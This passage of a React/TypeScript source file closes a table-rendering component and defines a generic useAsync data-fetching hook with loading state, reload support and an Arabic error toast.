                  <TableRow key={row[1]}>
                    <TableCell dir="ltr" className="font-mono text-xs">{row[0]}</TableCell>
                    <TableCell dir="ltr" className="font-mono text-xs text-primary">{row[1]}</TableCell>
                    <TableCell className="text-sm text-muted-foreground">{row[2]}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}

/* --------------------------------------------------------- generic hook */
function useAsync<T>(url: string) {
  const [data, setData] = useState<T | null>(null)
  const [loading, setLoading] = useState(true)
  const [tick, setTick] = useState(0)

  // reload() flips loading in the event handler (not inside the effect) and
  // bumps `tick` to retrigger the fetch.
  const reload = useCallback(() => {
    setLoading(true)
    setTick((t) => t + 1)
  }, [])

  useEffect(() => {
    let alive = true
    jget<T>(url)
      .then((d) => {
        if (!alive) return
        setData(d)
        setLoading(false)
      })
      .catch((e) => {
        if (!alive) return
        toast.error(e.message || 'فشل التحميل')
        setLoading(false)
      })
    return () => {
      alive = false
    }
  }, [url, tick])

  return { data, loading, reload }
}
